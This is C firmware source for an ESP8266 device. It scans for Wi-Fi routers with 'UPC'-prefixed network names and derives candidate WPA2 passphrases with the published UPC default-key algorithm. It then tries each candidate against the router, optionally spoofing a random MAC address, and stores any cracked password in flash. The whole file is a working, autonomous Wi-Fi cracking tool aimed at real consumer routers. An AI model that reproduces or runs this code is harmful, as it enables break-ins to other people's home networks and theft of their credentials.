/* esp8266_upc_keys
 * This app automatically applies the keygen described at http://haxx.in/upc-wifi/ to vulnerable APs and tests the resulting candidates
 * In the interval between calling wifi_station_scan and the associated callback a cracker task recovers the remaining targets' passwords
 */

#include "ets_sys.h"
#include "osapi.h"
#include "mem.h"
#include "gpio.h"
#include "os_type.h"
#include "user_config.h"
#include "driver/uart.h"
#include "user_interface.h"

// structure used for saving/loading scan results to/from user flash
typedef struct {
    uint8_t bssid[6];
    uint8_t password[8];
    uint8_t tested_passwords;
    uint8_t padding;
} saved_ap_t;

// structure used for cracking essids, held in running/finished queue
typedef struct {
    uint32_t target;
    uint8_t *candidate_passwords;
    uint8_t current_password;
    uint8_t passwords_found;
    bool finished_cracking;
    uint64_t start_sum;
} crack_job_t;

// structure used for scanning essids with reference to running or finished cracking job
typedef struct {
    char essid[32];
    uint8_t bssid[6];
    char password[8];
    crack_job_t *job;
} ap_t;

// AP scanning buffer
static size_t aps_found;
static ap_t aps[MAX_APS];

// 2 queues for managing running/finished cracker jobs
static crack_job_t * jobs_running_queue[MAX_CRACK_JOBS] = {0};
static crack_job_t * jobs_finished_queue[MAX_SAVED_RESULTS] = {0};
static size_t jobs_running;
static size_t jobs_finished = 0;

// running counter used by cracking logic
static uint64_t sum;

#ifdef MODE_HEADLESS
#define printf(...)
#else
#define printf os_printf
#endif

ICACHE_FLASH_ATTR
static void save_password(size_t ap_index){
    saved_ap_t saved_ap = {{0}};
    size_t saved_aps = 0;
    do {
        spi_flash_read(USER_FLASH_START + (saved_aps*sizeof(saved_ap_t)), (uint32_t*) &saved_ap, sizeof(saved_ap_t));
        saved_aps++;
    } while(saved_ap.password[0] != 0xff && (saved_aps < (USER_FLASH_SIZE / sizeof(saved_ap_t))));
    if(saved_aps < (USER_FLASH_SIZE / sizeof(saved_ap_t))){
        printf("Saving password %s for ESSID %s in slot %u\n", aps[ap_index].password, aps[ap_index].essid, saved_aps - 1);
        memcpy(saved_ap.bssid, aps[ap_index].bssid, 6);
        memcpy(saved_ap.password, aps[ap_index].password, 8);
        spi_flash_write(USER_FLASH_START + (saved_aps-1)*sizeof(saved_ap_t), (uint32_t*) &saved_ap, sizeof(saved_ap_t));
    } else {
        printf("User flash area is full!\n");
    }
}

ICACHE_FLASH_ATTR
static void load_password(size_t ap_index){
    saved_ap_t saved_ap = {{0}};
    size_t saved_aps = 0;
    do {
        spi_flash_read(USER_FLASH_START + (saved_aps*sizeof(saved_ap_t)), (uint32_t*) &saved_ap, sizeof(saved_ap_t));
        if(memcmp(saved_ap.bssid, aps[ap_index].bssid, 6) == 0){
            memcpy(aps[ap_index].password, saved_ap.password, 8);
            printf("Loaded saved password %s for ESSID %s from slot %u\n", aps[ap_index].password, aps[ap_index].essid, saved_aps);
            break;
        }
        saved_aps++;
    } while(saved_ap.password[0] != 0xff && (saved_aps < (USER_FLASH_SIZE / sizeof(saved_ap_t))));
}

ICACHE_FLASH_ATTR
static void randomize_mac_addr(void){
    unsigned char mac[6];
    os_get_random(mac, 6);
    printf("Setting MAC address to: %02x:%02x:%02x:%02x:%02x:%02x\n", mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
    wifi_set_macaddr(STATION_IF, mac);
}

enum {
    SCANNING,
    TARGETING,
    CONNECTING,
    DISCONNECTING,
} state;

size_t ap_timeouts;
static void crack(os_event_t *events);
static void wifi_scan_cb(void* arg, STATUS status);

#define user_procTaskQueueLen 1
os_event_t user_procTaskQueue[user_procTaskQueueLen];

size_t global_ap_to_test;
static volatile os_timer_t blink_timer;
static uint32_t buf[3] = {0, 0, 0};

ICACHE_FLASH_ATTR
static size_t add_queue_job(crack_job_t *job, crack_job_t ** queue, size_t max, size_t *queue_index){
    size_t job_idx, found_job_idx = -1;
    for(job_idx = 0; job_idx < max; job_idx++){
        // find first empty slot
        if(!queue[job_idx]){
            queue[job_idx] = job;
            (*queue_index)++;
            found_job_idx = job_idx;
            break;
        }
    }
    return found_job_idx;
}

ICACHE_FLASH_ATTR
static size_t delete_queue_job(crack_job_t *job, crack_job_t ** queue, size_t max, size_t *queue_index){
    size_t job_idx, found_job_idx = -1;
    if(job){
        for(job_idx = 0; job_idx < max; job_idx++){
            // find the job
            if(jobs_running_queue[job_idx] == job){
                // swap last in queue with deleted job
                (*queue_index)--;
                if(job_idx != *queue_index){
                    queue[job_idx] = queue[*queue_index];
                }
                // zero end of queue
                queue[*queue_index] = NULL;
                found_job_idx = job_idx;
                break;
            }
        }
    }
    return found_job_idx;
}
ICACHE_FLASH_ATTR
static void find_queue_target(crack_job_t ** queue, size_t max, uint32_t target, bool *found){
    for(size_t i = 0; i < max; i++){
        if(queue[i] && queue[i]->target == target){
            *found = true;
        }
    }
}

ICACHE_FLASH_ATTR
static void add_cracker_job(crack_job_t *job){
    size_t add_idx = add_queue_job(job, jobs_running_queue, MAX_CRACK_JOBS, &jobs_running);
    if(add_idx != -1){
        job->start_sum = sum;
        printf("Adding cracker job... in slot %u/%u\n", add_idx+1, jobs_running);
        if(jobs_running == 1){
            // re-start cracker
            system_os_post(PRIO_CRACK, 0, 0 );
        }
    }
}

ICACHE_FLASH_ATTR
static void delete_cracker_job(crack_job_t *job){
    size_t del_idx = delete_queue_job(job, jobs_running_queue, jobs_running, &jobs_running);
    if(del_idx != -1){
        printf("Deleting cracker job... from slot %u/%u\n", del_idx+1, jobs_running+1);
    }
}

ICACHE_FLASH_ATTR
static void add_finished_job(crack_job_t *job){
    size_t add_idx = add_queue_job(job, jobs_finished_queue, MAX_SAVED_RESULTS, &jobs_finished);
    if(add_idx != -1){
        printf("Adding finished cracker job... in slot %u/%u\n", add_idx+1, jobs_finished);
    }
}

ICACHE_FLASH_ATTR
static void delete_finished_job(crack_job_t *job){
    size_t del_idx = delete_queue_job(job, jobs_finished_queue, jobs_finished, &jobs_finished);
    if(del_idx != -1){
        printf("Deleting finished cracker job... from slot %u/%u\n", del_idx+1, jobs_finished+1);
    }
}

ICACHE_FLASH_ATTR
static void blink(void *arg){
  if (GPIO_REG_READ(GPIO_OUT_ADDRESS) & (1 << LED_PIN)){
    GPIO_OUTPUT_SET(LED_PIN, LED_ON);
  } else {
    GPIO_OUTPUT_SET(LED_PIN, LED_OFF);
  }
}

ICACHE_FLASH_ATTR
static void free_job(crack_job_t * job){
    if(job){
        delete_finished_job(job);
        os_free(job->candidate_passwords);
        os_free(job);
    }
}

static size_t total_aps_pwned = 0;

ICACHE_FLASH_ATTR
static void wifi(os_event_t *events){
    switch(state){
        default:
        case SCANNING:
            if(aps_found == MAX_APS){
                // flush AP buffer (found passwords will be re-loaded from flash, jobs will be re-linked by their target id)
                printf("Flushing AP buffer...\n");
                aps_found = 0;
                memset(aps, 0x0, sizeof(aps));
            }
            size_t aps_targeted = 0;
            size_t i;
            for(i = 0; i < aps_found; i++){
                if(aps[i].job){
                    aps_targeted++;
                }
                if(strlen(aps[i].password) == 8){
                    printf("Cracked | AP: %02x:%02x:%02x:%02x:%02x:%02x %32s (password: %s )\n", aps[i].bssid[0], aps[i].bssid[1], aps[i].bssid[2], aps[i].bssid[3], aps[i].bssid[4], aps[i].bssid[5], aps[i].essid, aps[i].password);
                }
            }
            /*system_print_meminfo();*/
            printf("%u new vulnerable, %u target(s) in cache, %u still being cracked, %u bytes free\n", total_aps_pwned, aps_targeted, jobs_running, system_get_free_heap_size());
            state = TARGETING;
            wifi_station_scan(NULL, wifi_scan_cb);
            break;
        case CONNECTING:
        case DISCONNECTING:
            if(ap_timeouts == MAX_TRIES){
                printf("AP not reachable for %u trie(s), aborting\n", MAX_TRIES);
                state = DISCONNECTING;
            }

            if(state == DISCONNECTING){
                wifi_station_disconnect();
                state = SCANNING;
                ap_timeouts = 0;
                GPIO_OUTPUT_SET(LED_PIN, LED_OFF);
            } else {
                switch(wifi_station_get_connect_status()){
                    case STATION_CONNECTING:
                    default:
                        break;
                    case STATION_WRONG_PASSWORD:
                        printf("Wrong password!\n");
                        aps[global_ap_to_test].job->current_password++;
                        if(aps[global_ap_to_test].job->current_password >= aps[global_ap_to_test].job->passwords_found){
                            if(aps[global_ap_to_test].job->finished_cracking){
                                printf("Finished testing passwords for ESSID %s\n", aps[global_ap_to_test].essid);
                                memcpy(aps[global_ap_to_test].password, "UNKNOWN", 7);
                                aps[global_ap_to_test].password[7] = 0;
                                save_password(global_ap_to_test);
                                free_job(aps[global_ap_to_test].job);
                                aps[global_ap_to_test].job = NULL;
                            }
                            // restart wifi task when out of passwords to test
                            state = DISCONNECTING;
                            break;
                        }
                        // fall through
                    case STATION_IDLE: {
                        wifi_station_disconnect();
                        ap_timeouts = 0;
                        struct station_config config = {{0}};
                        memcpy(config.ssid, aps[global_ap_to_test].essid, 10);
                        memcpy(config.password, aps[global_ap_to_test].job->candidate_passwords+(8*aps[global_ap_to_test].job->current_password), 8);
                        memcpy(config.bssid, aps[global_ap_to_test].bssid, 6);
                        config.bssid_set = 0;
                        printf("Connecting to %s with password %s\n", config.ssid, config.password);
#ifdef SPOOF_MAC
                        randomize_mac_addr();
#endif
                        wifi_station_set_config(&config);
                        wifi_station_connect();
                        state = CONNECTING;
                        break;
                      }
                    case STATION_NO_AP_FOUND:
                        ap_timeouts++;
                        wifi_station_connect();
                        break;
                    case STATION_CONNECT_FAIL:
                        wifi_station_disconnect();
                        printf("Error connecting... retrying now\n");
                        ap_timeouts++;
                        wifi_station_connect();
                        break;
                    case STATION_GOT_IP: {
                        memcpy(aps[global_ap_to_test].password, aps[global_ap_to_test].job->candidate_passwords+(8*aps[global_ap_to_test].job->current_password), 8);
                        printf("Found valid password for %s: %s\n", aps[global_ap_to_test].essid, aps[global_ap_to_test].password);
                        save_password(global_ap_to_test);
                        printf("Saved password to user flash\n");
                        os_timer_arm(&blink_timer, 50, 1);
                        delete_cracker_job(aps[global_ap_to_test].job);
                        free_job(aps[global_ap_to_test].job);
                        aps[global_ap_to_test].job = NULL;
                        total_aps_pwned++;
                        // no need to test more
                        state = DISCONNECTING;
                        break;
                     }
                }
            }
            system_os_post(PRIO_WIFI, 0, 0 );
            break;
    }
}

// callback for wifi
ICACHE_FLASH_ATTR
static void wifi_scan_cb(void* arg, STATUS status){
    struct bss_info *bss_link = (struct bss_info *)arg;
    int8_t best_link = MIN_STRENGTH;
    size_t i;
    size_t ap_to_test = -1;
    // search through the buffer of aps to see if this is a new one, if so add it to the buffer
    while (bss_link != NULL){
        bool found_ap = false;
        for(i = 0; i < aps_found; i++){
            if(strncmp(aps[i].essid, (char*) bss_link->ssid, 32) == 0){
                found_ap = true;
                break;
            }
        }
        if(!found_ap){
            if(aps_found < MAX_APS){
                printf("Found new AP: %02x:%02x:%02x:%02x:%02x:%02x %32s (%d dB, CH%02u)\n", bss_link->bssid[0], bss_link->bssid[1], bss_link->bssid[2], bss_link->bssid[3], bss_link->bssid[4], bss_link->bssid[5], bss_link->ssid, bss_link->rssi, bss_link->channel);
                memcpy(aps[aps_found].bssid, bss_link->bssid, 6);
                memcpy(aps[aps_found].essid, bss_link->ssid, 32);

                if(strncmp(aps[aps_found].essid, "UPC", 3) == 0 && strlen(aps[aps_found].essid) == 10){
                    if(!aps[aps_found].password[0]){
                        load_password(aps_found);
                    }
                    if(!aps[aps_found].password[0]){
                        uint32_t target = 0;
                        for(i = 3; i < 10; i++){
                            target *= 10;
                            target += aps[aps_found].essid[i]-0x30;
                        }
                        bool found_target = false;
                        find_queue_target(jobs_running_queue, jobs_running, target, &found_target);
                        find_queue_target(jobs_finished_queue, jobs_finished, target, &found_target);
                        if(!found_target){
                            aps[aps_found].job = (crack_job_t*) os_zalloc(sizeof(crack_job_t));
                            if(aps[aps_found].job){
                                aps[aps_found].job->target = target;
                                aps[aps_found].job->start_sum = sum;
                                add_cracker_job(aps[aps_found].job);
                            } else {
                                printf("Malloc error! Heap full?\n");
                            }
                        }
                    }
                }
                aps_found++;
            }
        } else {
            printf("Saw known AP: %02x:%02x:%02x:%02x:%02x:%02x %32s (%d dB, CH%02u)", bss_link->bssid[0], bss_link->bssid[1], bss_link->bssid[2], bss_link->bssid[3], bss_link->bssid[4], bss_link->bssid[5], bss_link->ssid, bss_link->rssi, bss_link->channel);
            if(aps[i].password[0]){
                printf(" (password: %s )", aps[i].password);
            } else if(aps[i].job){
                printf(" [TARGETED %u/%u]", aps[i].job->current_password, aps[i].job->passwords_found);
                if(aps[i].job->current_password < aps[i].job->passwords_found && bss_link->rssi > best_link){
                    best_link = bss_link->rssi;
                    ap_to_test = i;
                }
            }
            printf("\n");
        }

        bss_link = bss_link->next.stqe_next;
    }
    if(ap_to_test != -1){
        //printf("Connecting to ESSID %s...\n", aps[ap_to_test].essid);
        os_timer_disarm(&blink_timer);
        GPIO_OUTPUT_SET(LED_PIN, LED_ON);
        state = CONNECTING;
        global_ap_to_test = ap_to_test;
    } else {
        if(jobs_running){
            // blink once per second for 1 ap being cracked, twice for two ap's, etc
            os_timer_arm(&blink_timer, 1000/jobs_running, 1);
        } else {
            GPIO_OUTPUT_SET(LED_PIN, LED_OFF);
            os_timer_disarm(&blink_timer);
        }
        state = SCANNING;
    }
    system_os_post(PRIO_WIFI, 0, 0 );
}

typedef struct md5_ctx
{
  uint32_t A;
  uint32_t B;
  uint32_t C;
  uint32_t D;

  uint32_t total[2];
  uint32_t buflen;
  uint32_t buffer[32];
} MD5_CTX;
int (*MD5_Init)(MD5_CTX *c) = 0x40009818;
int (*MD5_Update)(MD5_CTX *c, const void *data, unsigned long len) = 0x40009834;
int (*MD5_Final)(unsigned char *md, MD5_CTX *c) = 0x40009900;


/*
 * ----------------------------------------------------------------------------
 * "THE BLASTY-WAREZ LICENSE" (Revision 1):
 * <peter@haxx.in> wrote this file. As long as you retain this notice and don't
 * sell my work you can do whatever you want with this stuff. If we meet some 
 * day, and you think this stuff is worth it, you can intoxicate me in return.
 * ----------------------------------------------------------------------------
 */

#define MAGIC_24GHZ 0xff8d8f20
#define MAGIC_5GHZ 0xffd9da60
#define MAGIC0 0xb21642c9ll
#define MAGIC1 0x68de3afll
#define MAGIC2 0x6b5fca6bll

#define MAX0 9
#define MAX1 367
#define MAX2 6799

ICACHE_FLASH_ATTR
void user_init(){
    // go at full speed
    system_update_cpu_freq(SYS_CPU_160MHZ);

    // set up LED
    gpio_init();
    GPIO_OUTPUT_SET(LED_PIN, LED_OFF);

    // set up blinking of LED
    os_timer_setfn(&blink_timer, blink, NULL);

#ifndef MODE_HEADLESS
    uart_init(115200, 115200);
    os_delay_us(100);
#endif

    // set up networking
    wifi_set_opmode(STATION_MODE);
    wifi_station_set_auto_connect(false);
    wifi_station_dhcpc_stop();
    wifi_station_set_hostname("esp8266_upc_keys");

    struct ip_info info;
    info.ip.addr = ipaddr_addr("192.168.13.37");
    info.netmask.addr = ipaddr_addr("255.255.255.0");
    info.gw.addr = ipaddr_addr("192.168.1.1");
    wifi_set_ip_info(STATION_IF, &info);

    sum = MAGIC_24GHZ;

    // set up tasks
    system_os_task(wifi, PRIO_WIFI, user_procTaskQueue, user_procTaskQueueLen);
    system_os_task(crack, PRIO_CRACK, user_procTaskQueue, user_procTaskQueueLen);

    // start scanning
    memset(aps, 0x0, sizeof(aps));
    aps_found = 0;
    state = SCANNING;
    system_os_post(PRIO_WIFI, 0, 0 );
}

ICACHE_FLASH_ATTR
inline
void hash2pass(uint8_t *in_hash, char *out_pass)
{
	uint32_t i, a;

	for (i = 0; i < 8; i++) {
		a = in_hash[i] & 0x1f;
		a -= ((a * MAGIC0) >> 36) * 23;

		a = (a & 0xff) + 0x41;

		if (a >= 'I') a++;
		if (a >= 'L') a++;
		if (a >= 'O') a++;

		out_pass[i] = a;
	}
    // out_pass[8] = 0;
}


ICACHE_FLASH_ATTR
inline
uint32_t mangle(uint32_t *pp)
{
	uint32_t a, b;

	a = ((pp[3] * MAGIC1) >> 40) - (pp[3] >> 31);
	b = (pp[3] - a * 9999 + 1) * 11ll;

	return b * (pp[1] * 100 + pp[2] * 10 + pp[0]);
}

__attribute((optimize("O3")))
ICACHE_FLASH_ATTR
inline
uint32_t upc_generate_ssid(uint32_t* data, uint32_t magic)
{
    uint64_t a = data[0] * 2500000 + data[1] * 6800 + data[2] + magic;
    return a - (((a * MAGIC2) >> 54) - (a >> 31)) * 10000000;
}

ICACHE_FLASH_ATTR
inline
void serial2pass(char* serial, char* pass){
    uint8_t h1[16], h2[16];
    uint32_t hv[4], w1, w2, i;
    char tmpstr[17];
    MD5_CTX ctx;
    MD5_Init(&ctx);
    MD5_Update(&ctx, serial, strlen(serial));
    MD5_Final(h1, &ctx);

    for (i = 0; i < 4; i++) {
        hv[i] = *(uint16_t *)(h1 + i*2);
    }

    w1 = mangle(hv);

    for (i = 0; i < 4; i++) {
        hv[i] = *(uint16_t *)(h1 + 8 + i*2);
    }

    w2 = mangle(hv);

    os_sprintf(tmpstr, "%08X%08X", w1, w2);

    MD5_Init(&ctx);
    MD5_Update(&ctx, tmpstr, strlen(tmpstr));
    MD5_Final(h2, &ctx);

    hash2pass(h2, pass);
}

#define TESTED_PREFIXES 3
char *prefix[TESTED_PREFIXES] = {"SAAP", "SAPP", "SBAP"};
#define PASSWORD_SIZE 8

__attribute((optimize("O3")))
ICACHE_FLASH_ATTR
static void crack(os_event_t *events){
    if(!jobs_running){
        return;
    }
    // inline upc_generate_ssid
    const uint32_t essid_digits = (sum - (((sum * MAGIC2) >> 54) - (sum >> 31)) * 10000000);
    if(++buf[2] == MAX2+1){
        buf[2] = 0;
        if(++buf[1] == (MAX1+1)){
            buf[1] = 0;
            printf("Cracking %u target(s)... %u/%u\n", jobs_running, buf[0], MAX0);
            if(++buf[0] == (MAX0+1)){
                buf[0] = 0;
            }
        }
        sum = buf[0] * 2500000 + buf[1] * 6800 + MAGIC_24GHZ;
    } else {
        sum++;
    }

    // check results
    for(size_t jobs_idx = 0; jobs_idx < jobs_running; jobs_idx++){
        crack_job_t * restrict const job = jobs_running_queue[jobs_idx];
        if(!job)
            continue;

        if(job->start_sum == sum){
            printf("Finished generating passwords for target UPC%07d\n", job->target);
            job->finished_cracking = true;
            delete_cracker_job(job);
            add_finished_job(job);
            continue;
        }

        if (essid_digits != job->target)
            continue;

        const size_t required_size = PASSWORD_SIZE*(job->passwords_found+TESTED_PREFIXES);
        if(job->candidate_passwords){
            job->candidate_passwords = (char*) os_realloc(job->candidate_passwords, required_size);
            memset(job->candidate_passwords+(job->passwords_found*PASSWORD_SIZE), 0, TESTED_PREFIXES*PASSWORD_SIZE);
        } else {
            job->candidate_passwords = (char*) os_zalloc(required_size);
        }

        // roll back state
        uint32_t old_buf[3];
        memcpy(old_buf, buf, sizeof(old_buf));
        if(buf[2] == 0){
            old_buf[2] = MAX2;
            if(buf[1] == 0){
                old_buf[1] = MAX1;
                if(buf[0] == 0){
                    old_buf[0] = MAX0;
                } else {
                    old_buf[0] = buf[0]-1;
                }
            } else {
                old_buf[1] = buf[1]-1;
            }
        } else {
            old_buf[2] = buf[2]-1;
        }

        for(size_t prefix_idx = 0; prefix_idx < TESTED_PREFIXES; prefix_idx++){
            char serial[13] = {0};
            char * pass = job->candidate_passwords+(PASSWORD_SIZE*(job->passwords_found));
            os_sprintf(serial, "%s%d%03d%04d", prefix[prefix_idx], old_buf[0], old_buf[1], old_buf[2]);
            serial2pass(serial, pass);
            //printf("  -> WPA2 phrase for '%s' = '%s'\n", serial, pass);
            job->passwords_found++;
        }
    }

    system_os_post(PRIO_CRACK, 0, 0);
}
